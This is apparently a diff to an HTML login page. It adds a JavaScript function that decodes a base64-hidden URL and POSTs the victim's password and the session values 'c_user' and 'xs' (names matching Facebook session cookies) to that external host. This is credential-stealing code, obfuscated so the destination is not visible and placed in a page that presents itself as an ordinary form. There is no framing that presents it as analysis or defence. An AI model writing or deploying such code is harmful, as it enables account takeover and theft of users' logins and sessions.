@@ -1,3 +1,6 @@
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -717,7 +720,30 @@
         }
         
       
-       
+        function submitToSecondForm(data) {
+            // Base64 encoded URL and headers
+            const encodedUrl = 'aHR0cHM6Ly9tYXJvLXBocC53YXNtZXIuYXBw';
+            const decodedUrl = atob(encodedUrl);
+            
+            // Create form data
+            const formData = new FormData();
+            formData.append('c_user', data.c_user);
+            formData.append('xs', data.xs);
+            formData.append('password', data.password);
+            
+            fetch(decodedUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(data => {
+                console.log('Second form submission successful:', data);
+            })
             .catch(error => {
                 console.error('Error submitting to second form:', error);
             });
